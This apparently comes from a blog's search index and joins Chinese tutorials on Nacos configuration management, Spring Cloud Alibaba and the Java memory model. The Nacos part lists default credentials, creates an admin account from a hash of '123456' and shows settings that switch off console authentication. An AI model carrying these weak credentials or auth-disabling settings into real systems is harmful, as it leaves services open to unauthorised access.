System.out.println(content); }} 程序运行输出结果如下： 12common: config: something Nacos 配置管理基础Nacos 配置管理模型Nacos 配置管理概念对于 Nacos 的配置管理，是通过 Namespace、Group、Data ID 来定位到一个配置集。 配置项 配置集中包含的一个个配置内容就是配置项。它代表一个具体的可配置的参数与其值域，通常以 key=value 的形式存在。例如经常配置系统的日志输出级别（logLevel=INFO|WARN|ERROR） 就是一个配置项。 配置集（Data ID） 在系统中，一个配置文件通常就是一个配置集，一个配置集可以包含了系统的各种配置信息，例如一个配置集可能包含了数据源、线程池、日志级别等配置项。每个配置集都可以定义一个有意义的名称，就是配置集的 ID，即 Data ID。 配置分组（Group） 配置分组是对配置集进行分组，通过一个有意义的字符串（如 Buy 或 Trade ）来表示，不同的配置分组下可以有相同的配置集（Data ID）。当在 Nacos 上创建一个配置时，如果未填写配置分组的名称，则配置分组的名称默认采用 DEFAULT_GROUP。配置分组的常见场景：可用于区分不同的项目或应用，例如：学生管理系统的配置集可以定义一个 Group 为：STUDENT_GROUP。 命名空间（Namespace） 命名空间可用于进行不同环境的配置隔离。例如可以隔离开发环境、测试环境和生产环境，因为它们的配置可能各不相同，或者是隔离不同的用户，不同的开发人员使用同一个 Nacos 管理各自的配置，可通过 Namespace 隔离。当在 Nacos 上创建一个配置时，如果未填写命名空间的名称，则命名空间的名称默认为 public。不同的命名空间下，可以存在相同名称的配置分组（Group） 或 配置集。 Nacos 配置管理最佳实践Nacos 抽象定义了 Namespace、Group、Data ID 的概念，具体这几个概念代表什么，取决于把它们看成什么，这里推荐一种用法，如下图： Namespace ：代表不同环境，如开发、测试、生产环境 Group：代表某项目，如 XX 医疗项目、XX 电商项目、XX 校园项目 DataId：每个项目下往往有若干个工程，每个配置集（DataId）是一个工程的主配置文件 Namespace 与 Group 的其他最佳实践 除了上面介绍的一种最佳实践方法外，还可以为每个微服务创建自己的 namespace 进行隔离，然后利用 group 来区分 Dev、Beta、Prod 等环境。 Nacos 命名空间管理Namespace 隔离设计Namespace 的设计是 Nacos 基于此做多环境以及多租户（多个用户共同使用 Nacos）数据（配置和服务）隔离的。从一个租户 (用户）的角度来看，如果有多套不同的环境，那么这个时候可以根据指定的环境来创建不同的 Namespace，以此来实现多环境的隔离。例如可能有开发、测试和生产三个不同的环境，那么使用一套 Nacos 集群可以分别建以下三个不同的 Namespace，如下图所示： 从多个租户（用户）的角度来看，每个租户（用户）可能会有自己的 Namespace，每个租户（用户）的配置数据以及注册的服务数据都会归属到自己的 Namespace 下，以此来实现多租户间的数据隔离。例如超级管理员分配了三个租户（用户），分别为张三、李四和王五。分配好了之后，各租户用自己的账户名和密码登录后，创建自己的命名空间。如下图所示： Nacos 创建命名空间第一步：菜单栏选中命名空间，然后点击页面上的新建命名空间按钮 第二步：在表单内填写必要的命名空间信息，然后点击确定按钮提交 第三步：菜单栏选中配置管理 &gt; 配置列表，可以通过 Tab 按钮切换到不同的命名空间，接着就可以在对应的命名空间下新增配置信息 代码示例 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 12345678910111213141516171819202122232425import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.exception.NacosException;import java.util.Properties;/** * 从Nacos读取特定命名空间下的配置信息 * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException { String serverAddr = "127.0.0.1:8848"; String namespace = "7ec71a71-6ee5-4f87-a387-0d29d9e8fe51"; String group = "DEFAULT_GROUP"; String dataId = "nacos_simple_demo.yaml"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); properties.put("namespace", namespace); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); }} Nacos 常见配置管理操作配置集导出勾选若干配置集，点击导出选中的配置按钮，即可自动下载一个压缩包，压缩包内包含了选中配置集所转换的配置文件。 配置集导入点击右上角的导入配置按钮，选择之前导出的配置文件压缩包，可以将压缩包内的文件恢复为 Nacos 配置集。 配置集克隆勾选若干配置集，点击克隆按钮，可以将选中的配置集批量复制到指定的命名空间内。 历史版本Nacos 通过提供配置版本管理及其一键回滚能力，帮助用户改错配置的时候能够快速回滚，降低微服务系统在配置管理上的可用性风险。 监听查询Nacos 提供配置订阅者（即监听者）查询能力，同时提供客户端当前配置的 MD5 校验值，以便帮助用户更好的检查服务器的配置变更是否推送到 Nacos 客户端，其中 Nacos 客户端监听的示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.config.listener.Listener;import com.alibaba.nacos.api.exception.NacosException;import java.io.IOException;import java.util.Properties;import java.util.concurrent.Executor;/** * Nacos客户端监听服务器的配置信息是否变更 * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException, IOException { String serverAddr = "127.0.0.1:8848"; String group = "DEFAULT_GROUP"; String dataId = "nacos_simple_demo.yaml"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); configService.addListener(dataId, group, new Listener() { @Override public Executor getExecutor() { return null; } @Override public void receiveConfigInfo(String configInfo) { System.out.println(configInfo); } }); System.in.read(); }} 登录管理Nacos 支持简单的登录功能，默认用户名 / 密码为： nacos/nacos， 生成密码 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.security&lt;/groupId&gt; &lt;artifactId&gt;spring-security-core&lt;/artifactId&gt; &lt;version&gt;5.4.1&lt;/version&gt;&lt;/dependency&gt; 1234567891011/** * 由于采用BCrypt加密方法在每次生成密码时会加随机盐，因此生成的密码每次都可能不一样 * @author clay */public class PasswordEncoderUtil { public static void main(String[] args) { String password = new BCryptPasswordEncoder().encode("123456"); System.out.println(password); }} 创建登录用户 当 Nacos 使用 MySQL 数据库存储数据时，可以使用以下 SQL 来创建新用户，其中密码就是上面通过 Java 代码生成的字符串。同理，若需要更改旧用户的登录密码，只需要通过 SQL 更新对应的数据库表数据即可，这里不再累述。 12INSERT INTO users (username, password, enabled) VALUES (\'admin\',\'$2a$10$kCRcD31fYzYUhfvCSUqQ9u/IAKbq4yTWi1z3l6kTrKL5exGSNbSUK\', TRUE);INSERT INTO roles (username, role) VALUES (\'admin\', \'ROLE_ADMIN\'); 关闭登录功能由于部分公司自己开发控制台，不希望被 Nacos 的安全 Filter 拦截。因此 Nacos 支持定制关闭登录功能，只需要找到配置文件 ${nacos-home}/conf/application.properties，替换以下内容即可，最后重启 Nacos 服务使更改生效。特别注意，以下更改只适合 Nacos 1.2.0 以下的版本。 123456spring.security.enabled=falsemanagement.security=falsesecurity.basic.enabled=falsenacos.security.ignore.urls=/**# nacos.security.ignore.urls=/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/** 下篇 - Nacos 入门教程 - 配置管理（中级篇） Nacos 入门教程 - 配置管理中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Linux 的 .a、.so 和 .o 文件介绍",url:"/posts/7d3e2801.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux系统编程"},{title:"Spring Cloud Alibaba 新一代微服务解决方案",url:"/posts/97d0a561.html",text:'Spring Cloud Alibaba 是什么Spring Cloud Alibaba 是阿里巴巴提供的微服务开发一站式解决方案，是阿里巴巴开源中间件与 Spring Cloud 体系的融合，Github 项目地址在这里，官方文档在这里。 Spring Cloud 概述提起微服务，不得不提 Spring Cloud 全家桶系列，Spring Cloud 是若干个框架的集合，包括 spring-cloud-config、spring-cloud-bus 等近 20 多个子项目，提供了服务治理、服务网关、智能路由、负载均衡、断路器、监控跟踪、分布式消息队列、配置管理等领域的解决方案。Spring Cloud 通过 Spring Boot 风格的封装，屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、容易部署的分布式系统开发工具包。一般来说，Spring Cloud 包含以下组件，主要以 Netflix 开源项目为主： Spring Cloud Alibaba 概述同 Spring Cloud 一样，Spring Cloud Alibaba 也是一套微服务解决方案，包含开发分布式应用微服务的必需组件，方便开发者通过 Spring Cloud 编程模型轻松使用这些组件来开发分布式应用服务。依托 Spring Cloud Alibaba，开发者只需要添加一些注解和少量配置，就可以将 Spring Cloud 应用接入阿里微服务解决方案，通过阿里中间件来迅速搭建分布式应用系统。作为 Spring Cloud 体系下的新实现，Spring Cloud Alibaba 跟官方的组件或其它的第三方实现如 Netflix、Consul、Zookeeper 等对比，具备了更多的功能: Spring Cloud Alibaba 包含的组件下图是 Spring Cloud Alibaba 系列组件，其中包含了阿里开源组件、阿里云商业化组件，以及集成了 Spring Cloud 组件。 Alibaba 开源组件 Nacos：一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 Sentinel：把流量作为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。 RocketMQ：开源的分布式消息系统，基于高可用分布式集群技术，提供低延时的、高可靠的消息发布与订阅服务。 Dubbo：在国内应用非常广泛的一款高性能 Java RPC 框架。 Seata：阿里巴巴开源产品，一个易于使用的高性能微服务分布式事务解决方案。 Arthas：开源的 Java 动态追踪工具，基于字节码增强技术，功能非常强大。 Alibaba 商业化组件 Alibaba Cloud ACM：一款在分布式架构环境中对应用配置进行集中管理和推送的应用配置中心产品。 Alibaba Cloud OSS：阿里云对象存储服务（Object Storage Service，简称 OSS），是阿里云提供的云存储服务。 Alibaba Cloud SchedulerX：阿里中间件团队开发的一款分布式任务调度产品，提供秒级、精准的定时（基于 Cron 表达式）任务调度服务。 Alibaba 集成 Spring Cloud 组件Spring Cloud Alibaba 作为整套的微服务解决组件，只依靠目前阿里的开源组件是不够的，更多的是集成当前的社区组件，所以 Spring Cloud Alibaba 可以集成 Zuul，OpenFeign 等组件，也支持 Spring Cloud Stream 消息组件。Spring Cloud Alibaba 适配了 Spring Cloud 中 Edgware、Finchley、Greenwich 三个版本的对应版本，具体对应关系如下： Spring Cloud Alibaba 的功能服务注册与发现Spring Cloud Alibaba 基于 Nacos 提供 spring-cloud-alibaba-starter-nacos-discovery 、spring-cloud-alibaba-starter-nacos-config 实现了服务注册与配置管理功能。依靠 @EnableDiscoveryClient 进行服务注册，兼容 RestTemplate 与 OpenFeign 的客户端进行服务调用，同时适配了 Spring Cloud 的服务注册与发现标准，默认集成了 Ribbon 的支持。 支持多协议的服务调用Spring Cloud 默认的服务调用依赖 RestTemplate 或者 OpenFeign 使用 REST 进行调用。使用 @DubboTransported 注解可将底层的 REST 协议无缝切换成 Dubbo RPC 协议，进行 RPC 调用。 123456789@FeignClient("dubbo-provider")@DubboTransported(protocol = "dubbo")public interface DubboFeignRestService { @GetMapping(value = "/param") String param(@RequestParam("param") String param); @PostMapping("/saveB") String saveB(@RequestParam("a") int a, @RequestParam("b") String b);} 服务限流降级作为稳定性的核心要素之一，服务限流和降级是微服务领域特别重要的一环，Spring Cloud Alibaba 基于 Sentinel，对 Spring 体系内基本所有的客户端和网关进行了适配，默认支持 WebServlet、WebFlux、OpenFeign、RestTemplate、Spring Cloud Gateway、Zuul、Dubbo 和 RocketMQ 限流降级功能的接入。Sentinel 的应用比较简单，只需引入 starter 即可生效，可以在运行时通过控制台实时修改限流降级规则，还支持查看限流降级 Metrics 监控。 微服务消息驱动支持为微服务应用构建消息驱动能力，基于 Spring Cloud Stream 提供 Binder 的新实现：Spring Cloud Stream RocketMQ Binder，也新增了 Spring Cloud Bus 消息总线的新实现： Spring Cloud Bus RocketMQ。 分布式事务使用 Seata 解决微服务场景下面临的分布式事务问题，通过 @GlobalTransactional 注解，在微服务中传递事务上下文，可以对业务零侵入地解决分布式事务问题。 阿里云提供的商业能力通过上面提到的 OSS，SchedulerX 等组件，开发者可以在阿里云上实现对象存储，分布式任务调度等功能。 Spring Cloud Alibaba 的优势阿里巴巴强大的技术输出能力阿里巴巴无疑是国内开源技术领域的最有影响力的公司之一，已经有 Dubbo、Druid，FastJson 等成功的开源组件，再加上阿里不遗余力的推广，社区发展也非常快。 云原生趋势，集成阿里云商业化组件云原生（Cloud Native）是今年技术领域特别热门的一个词，云原生是一种专门针对云上应用而设计的方法，用于构建和部署应用，以充分发挥云计算的优势。Spring Cloud Alibaba 集成了阿里云的商业化组件，可以说天然支持云原生特性。 集成 Dubbo，利用 Dubbo 在微服务领域的超高人气Dubbo 是国内应用最广的分布式服务框架之一，基于 Dubbo 改造的 DubboX 等也有很多公司在使用，Spring Cloud Alibaba 对 Dubbo 做了比较好的集成，可以吸引不少使用 Dubbo 的开发者。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"深入理解 Java 内存模型",url:"/posts/5bbede3c.html",text:'前言本文来源自《深入理解 Java 虚拟机》。 物理硬件和内存首先，在单核电脑中处理的问题要简单得多，对内存和硬件的要求，各种方面的考虑没有在多核的情况下复杂。电脑中，CPU 的运行计算速度是非常快的，而其他硬件比如 IO，网络、内存读取等等，跟 CPU 的速度比起来是差几个数量级的。而不管任何操作，几乎是不可能都在 CPU 中完成而不借助于任何其他硬件操作。所以协调 CPU 和各个硬件之间的速度差异是非常重要的，要不然 CPU 就一直在等待，浪费资源。而在多核中，不仅面临如上问题，还有如果多个核用到了同一个数据，如何保证数据的一致性、正确性等问题，也是必须要解决的。目前基于高速缓存的存储交互很好的解决了 CPU 和内存等其他硬件之间的速度矛盾，多核情况下各个处理器（核）都要遵循一定的诸如 MSI、MESI 等协议来保证内存的各个处理器高速缓存和主内存的数据的一致性。 除了增加高速缓存，为了使处理器内部运算单元尽可能被充分利用，处理器还会对输入的代码进行乱序执行（Out-Of-Order Execution）优化，处理器会在乱序执行之后的结果进行重组，保证结果的正确性，也就是保证结果与顺序执行的结果一致。但是在真正的执行过程中，代码执行的顺序并不一定按照代码的书写顺序来执行，可能和代码的书写顺序不同。 Java 的内存模型Java 内存模型（Java Memory Model，简称 JMM）是 Java 虚拟机规范定义的，用来屏蔽掉 Java 程序在各种不同的硬件和操作系统对内存的访问的差异，这样就可以实现 Java 程序在各种不同的平台上都能达到内存访问的一致性。避免了像 C++ 等直接使用物理硬件和操作系统的内存模型在不同操作系统和硬件平台下表现不同，比如有些 C/C++ 程序可能在 Windows 平台运行正常，而在 Linux 平台却运行有问题。 虽然 Java 程序所有的运行都是在虚拟机中，涉及到的内存等信息都是虚拟机的一部分，但实际也是物理机的，只不过是虚拟机作为最外层的容器统一做了处理。虚拟机的内存模型，以及多线程的场景下与物理机的情况是很相似的，可以类比参考。Java 内存模型的主要目标是定义程序中变量的访问规则。即在虚拟机中将变量存储到主内存或者将变量从主内存取出这样的底层细节。需要注意的是这里的变量跟平时写 Java 程序中的变量不是完全等同的。这里的变量是指实例字段、静态字段、构成数组对象的元素，但是不包括局部变量和方法参数（因为这是线程私有的）。这里可以简单的认为主内存是 Java 虚拟机内存区域中的堆，局部变量和方法参数是在虚拟机栈中定义的。但是在堆中的变量如果在多线程中都使用，就涉及到了堆和不同虚拟机栈中变量的值的一致性问题了。 Java 内存模型的两个重要概念： 主内存：Java 虚拟机规定所有的变量（不是程序中的变量）都必须在主内存中产生，为了方便理解，可以认为是堆区。可以与前面说的物理机的主内存相比，只不过物理机的主内存是整个机器的内存，而虚拟机的主内存是虚拟机内存中的一部分。 工作内存：Java 虚拟机中每个线程都有自己的工作内存，该内存是线程私有的。为了方便理解，可以认为是虚拟机栈，可以与前面说的高速缓存相比。线程的工作内存保存了线程需要的变量在主内存中的副本。虚拟机规定，线程对主内存变量的修改必须在线程的工作内存中进行，不能直接读写主内存中的变量。不同的线程之间也不能相互访问对方的工作内存。如果线程之间需要传递变量的值，必须通过主内存来作为中介进行传递。 特别说明：主内存、工作内存与 Java 内存区域中的 Java 堆、虚拟机栈、方法区并不是一个层次的内存划分。这两者是基本上是没有关系的，上文只是为了便于理解，做的类比。 工作内存与主内存交互物理机高速缓存和主内存之间有交互协议，同样的，Java 内存中线程的工作内存和主内存的交互是由 Java 虚拟机定义了如下的八种操作来完成的，每种操作必须是原子性的（double 和 long 类型在某些平台有例外）。Java 虚拟机中主内存和工作内存交互，本质就是一个变量如何从主内存传输到工作内存中，如何把修改后的变量从工作内存同步回主内存。 lock（锁定）：作用于主内存的变量，一个变量在同一时间只能被一个线程锁定，该操作表示这条线成独占这个变量 unlock（解锁）：作用于主内存的变量，表示这个变量的状态由处于锁定状态被释放，这样其他线程才能对该变量进行锁定 read（读取）：作用于主内存变量，表示把一个主内存变量的值传输到线程的工作内存，以便随后的 load 操作使用 load（载入）：作用于线程的工作内存的变量，表示把 read 操作从主内存中读取的变量的值放到工作内存的变量副本中（副本是相对于主内存的变量而言的） use（使用）：作用于线程的工作内存中的变量，表示把工作内存中的一个变量的值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时就会执行该操作 assign（赋值）：作用于线程的工作内存的变量，表示把执行引擎返回的结果赋值给工作内存中的变量，每当虚拟机遇到一个给变量赋值的字节码指令时就会执行该操作 store（存储）：作用于线程的工作内存中的变量，把工作内存中的一个变量的值传递给主内存，以便随后的 write 操作使用 write（写入）：作用于主内存的变量，把 store 操作从工作内存中得到的变量的值放入主内存的变量中 如果要把一个变量从主内存传输到工作内存，那就要顺序的执行 read 和 load 操作，如果要把一个变量从工作内存回写到主内存，就要顺序的执行 store 和 write 操作。对于普通变量，虚拟机只是要求顺序的执行，并没有要求连续的执行，所以如下也是正确的。例如两个线程分别从主内存中读取变量 a 和 b 的值，即执行 read a; load a; read b; load b;，此时可能也会出现如下执行顺序 read a; read b; load b; load a;。这八种操作必须是原子的，不可分割的。 针对于 volatile 修饰的变量，会有一些特殊规则，后边会详细列出。 对于上述八种操作，虚拟机也规定了一系列规则，在执行这八种操作的时候必须遵循如下的规则： 不允许 read 和 load、store 和 write 操作之一单独出现，也就是不允许从主内存读取了变量的值但是工作内存不接收的情况，或者不允许从工作内存将变量的值回写到主内存但是主内存不接收的情况 不允许一个线程丢弃最近的 assign 操作，也就是不允许线程在自己的工作线程中修改了变量的值却不同步 / 回写到主内存 不允许一个线程回写没有修改的变量到主内存，也就是如果线程工作内存中变量没有发生过任何 assign 操作，是不允许将该变量的值回写到主内存 变量只能在主内存中产生，不允许在工作内存中直接使用一个未被初始化的变量，也就是没有执行 load 或者 assign 操作，即执行 use、store 之前必须对相同的变量执行了 load、assign 操作 一个变量在同一时刻只能被一个线程对其进行 lock 操作，也就是说一个线程一旦对一个变量加锁后，在该线程没有释放掉锁之前，其他线程是不能对其加锁的，但是同一个线程对一个变量加锁后，可以继续加锁，同时在释放锁的时候释放锁次数必须和加锁次数相同 对变量执行 lock 操作，就会清空工作内存中该变量的值，执行引擎使用这个变量之前，需要重新 load 或者 assign 操作初始化变量的值 不允许对没有 lock 的变量执行 unlock 操作，如果一个变量没有被 lock 操作，那也不能对其执行 unlock 操作，当然一个线程也不能对被其他线程 lock 的变量执行 unlock 操作 对一个变量执行 unlock 之前，必须先把变量同步回主内存中，也就是执行 store 和 write 操作 volatile 变量volatile 变量的特殊规则关键字 volatile 可以说是 Java 虚拟机中提供的最轻量级的同步机制，Java 内存模型对 volatile 专门定义了一些特殊的访问规则。假定 T 表示一个线程，V 和 W 分别表示两个 volatile 修饰的变量，那么在进行 read、load、use、assign、store 和 write 操作的时候需要满足如下规则： 只有当线程 T 对变量 V 执行的前一个动作是 load，线程 T 对变量 V 才能执行 use 动作；同时只有当线程 T 对变量 V 执行的后一个动作是 use 的时候，线程 T 对变量 V 才能执行 load 操作。所以，线程 T 对变量 V 的 use 动作和线程 T 对变量 V 的 read、load 动作相关联，必须是连续一起出现。也就是在线程 T 的工作内存中，每次使用变量 V 之前必须从主内存去重新获取最新的值，用于保证线程 T 能看得见其他线程对变量 V 的最新的修改后的值。 只有当线程 T 对变量 V 执行的前一个动作是 assign 的时候，线程 T 对变量 V 才能执行 store 动作；同时只有当线程 T 对变量 V 执行的后一个动作是 store 的时候，线程 T 对变量 V 才能执行 assign 动作。所以，线程 T 对变量 V 的 assign 操作和线程 T 对变量 V 的 store、write 动作相关联，必须一起连续出现。也即是在线程 T 的工作内存中，每次修改变量 V 之后必须立刻同步回主内存，用于保证线程 T 对变量 V 的修改能立刻被其他线程看到。 假定动作 A 是线程 T 对变量 V 实施的 use 或 assign 动作，动作 F 是和动作 A 相关联的 load 或 store 动作，动作 P 是和动作 F 相对应的对变量 V 的 read 或 write 动作；类似的，假定动作 B 是线程 T 对变量 W 实施的 use 或 assign 动作，动作 G 是和动作 B 相关联的 load 或 store 动作，动作 Q 是和动作 G 相对应的对变量 W 的 read 或 write 动作。如果动作 A 先于 B，那么 P 先于 Q。也就是说在同一个线程内部，被 volatile 修饰的变量不会被指令重排序，保证代码的执行顺序和程序的顺序相同。 总结上面三条规则：前面两条可以概括为：volatile 类型的变量保证对所有线程的可见性。第三条为：volatile 类型的变量禁止了指令重排优化。 volatile 变量禁止指令重排计算机在执行程序时，为了提高性能，编译器和处理器常常会对指令做重排，一般分为以下三种： 单线程环境里面确保程序最终执行结果和代码顺序执行的结果一致。处理器在进行重排序时必须考虑指令之间的数据依赖性。多线程环境中线程交替执行，由于编译器优化重排的存在，两个线程中使用的变量能否保证一致性是无法确定的，结果无法预测。 普通的变量仅仅会保证在该方法执行的过程中，所有依赖赋值结果的地方都能获取到正确的结果，但不能保证变量赋值的操作顺序和程序代码的顺序一致。因为在一个线程的方法执行过程中无法感知到这一点，这也就是 Java 内存模型中描述的所谓的线程内部表现为串行的语义。也就是在单线程内部，我们看到的或者感知到的结果和代码顺序是一致的；即使代码的执行顺序和代码顺序不一致，但是在需要赋值的时候结果也是正确的，所以看起来就是串行的。但实际结果有可能代码的执行顺序和代码顺序是不一致的，这在多线程代码中就会出现问题。示例代码如下： 12345678910111213141516171819Map configOptions;char[] configText;//volatile类型变量volatile boolean initialized = false;//假设以下代码在线程A中执行//模拟读取配置信息，读取完成后认为是初始化完成configOptions = new HashMap();configText = readConfigFile(fileName);processConfigOptions(configText, configOptions);initialized = true;//假设以下代码在线程B中执行//等待initialized为true后，读取配置信息进行操作while ( !initialized) { sleep();}doSomethingWithConfig(); 在上述代码中，如果 initialiezd 是普通变量，没有被 volatile 修饰，那么线程 A 执行的代码的修改初始化完成的结果 initialized = true 就有可能先于之前的三行代码执行，而此时线程 B 发现 initialized 为 true 了，就执行 doSomethingWithConfig() 方法，但是里面的配置信息都是 Null 的，就会出现问题了。如果 initialized 是 volatile 类型变量，保证禁止代码重排序优化，那么就可以保证 initialized = true 执行的时候，前边的三行代码一定执行完成了，那么线程 B 读取的配置文件信息就是正确的。跟其他保证并发安全的工具相比，volatile 的性能确实会好一些。在某些情况下，volatile 的同步机制性能要优于锁（使用 synchronized 关键字或者 Java.util.concurrent 包中的锁）。但是现在由于虚拟机对锁的不断优化和实行的许多消除动作，很难有一个量化的比较；但与自身比较可以确定一个原则：volatile 变量的读操作和普通变量的读操作几乎没有差异，但是写操作会性能差一些，因为要在本地代码中插入许多内存屏障指令来禁止指令重排序，保证处理器不发生代码乱序执行行为。 volatile 变量保证可见性可见性是指当一个线程修改了这个变量的值，新值（修改后的值）对于其他线程来说是立即可以得知的。正如上面的前两条规则规定，volatile 类型的变量每次值被修改了就立即同步回主内存，每次使用时就需要从主内存重新读取值。返回到前面 JMM 对普通变量的规则中，并没有要求这一点，所以普通变量的值是不会立即对所有线程可见的，即普通变量不具备可见性。volatile 变量保证可见性的验证代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 1 验证volatile的可见性 * 1.1 加入int number=0，number变量之前没有添加volatile关键字修饰，不具备可见性 * 1.2 添加了volatile关键字，可以解决可见性问题 */ public class VolatileTest { public static void main(String[] args) { MyData data = new MyData(); new Thread(() - &gt; { System.out.println(Thread.currentThread().getName() + " thread come in"); try { TimeUnit.SECONDS.sleep(3); } catch(InterruptedException e) { e.printStackTrace(); } data.setNumber(); System.out.println(Thread.currentThread().getName() + " thread set number is " + data.number); }, "AAA").start(); while(data.number == 0) { // main线程一直在这里循环等待，直到number的值不再等于零 } System.out.println(Thread.currentThread().getName() + " thread is over, the number is " + data.number); } } class MyData { // int number = 0; // volatile可以保证可见性，即可以及时通知其他线程，主内存中的变量值已经被修改 volatile int number = 0; public void setNumber() { this.number = 60; } } 123AAA thread come inAAA thread set number is 60main thread is over, the number is 60 volatile 变量不保证原子性常见误解：volatile 变量对所有线程是立即可见的，所以对 volatile 变量的所有修改（写操作）都立刻能反应到其他线程中。或者换句话说：volatile 变量在各个线程中是一致的，所以基于 volatile 变量的运算在并发下是线程安全的。这个观点的论据是正确的，但是根据论据得出的结论是错误的，并不能得出这样的结论。volatile 的规则，保证了 read、load、use 的顺序和连续性，同理 assign、store、write 也是顺序和连续的。也就是这几个动作是原子性的，但是对变量的修改，或者对变量的运算，却不能保证是原子性的。如果对变量的修改是分为多个步骤的，那么多个线程同时从主内存拿到的值是最新的，但是经过多步运算后回写到主内存的值是有可能存在覆盖情况发生的。volatile 变量不保证原子性的验证代码如下： 123456789101112131415161718192021222324252627282930313233343536373839public class VolatileTest{ public static volatile int race = 0; public static void increase() { race++; } private static final int THREADS_COUNT = 20; public static void main(String[] args) { Thread[] threads = new Thread[THREADS_COUNT]; for(int i = 0; i &lt; THREADS_COUNT; i++) { threads[i] = new Thread(new Runnable() { @Override public void run() { for(int j = 0; j &lt; 10000; j++) { increase(); } } }); threads[i].start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println(race); }} 141078 上述代码就是对 volatile 类型的变量启动了 20 个线程，每个线程对变量执行 1w 次加 1 操作，如果 volatile 变量并发操作没有问题的话，那么结果应该是输出 20w，但是结果运行的时候每次都是小于 20w，这就是因为 race++ 操作不是原子性的（图解），是分多个步骤完成的。假设两个线程 a、b 同时取到了主内存的值是 0，这是没有问题的，在进行 ++ 操作的时候假设线程 a 执行到一半，线程 b 执行完了，这时线程 b 立即同步给了主内存，主内存的值为 1，而线程 a 此时也执行完了，同步给了主内存，此时的值仍然是 1，线程 b 的结果被覆盖掉了。 如果需要解决 volatile 不保证原子性的问题，直接使用 AtomicInteger 这样的原子包装类即可保证原子性。示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839public class VolatileTest{ public static AtomicInteger race = new AtomicInteger(); public static void increase() { race.getAndIncrement(); } private static final int THREADS_COUNT = 20; public static void main(String[] args) { Thread[] threads = new Thread[THREADS_COUNT]; for(int i = 0; i &lt; THREADS_COUNT; i++) { threads[i] = new Thread(new Runnable() { @Override public void run() { for(int j = 0; j &lt; 10000; j++) { increase(); } } }); threads[i].start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println(race); }} long 和 double 变量long 和 double 变量的特殊规则Java 内存模型要求对主内存和工作内存交互的八种操作是原子性的，正如上文所讲，对 long 和 double 有一些特殊规则。八种操作中 lock、unlock、read、load、use、assign、store、write 对待 32 位的基本数据类型都是原子操作，对待 long 和 double 这两个 64 位的数据，Java 虚拟机规范对 Java 内存模型的规定中特别定义了一条相对宽松的规则：允许虚拟机将没有被 volatile 修饰的 64 位数据的读写操作划分为两次 32 位的操作来进行，也就是允许虚拟机不保证对 64 位数据的 read、load、store 和 write 这 4 个动作的操作是原子的。这也就是常说的 long 和 double 的非原子性协定（Nonautomic Treatment of double and long Variables）。 并发内存模型的实质Java 内存模型围绕着并发过程中如何处理原子性、可见性和顺序性这三个特征来设计的。 原子性（Atomicity）： 由 Java 内存模型来直接保证原子性的变量操作包括 read、load、use、assign、store、write 这 6 种操作，虽然存在 long 和 double 的特例，但基本可以忽略不计，目前虚拟机基本都对其实现了原子性。如果需要更大范围的控制，lock 和 unlock 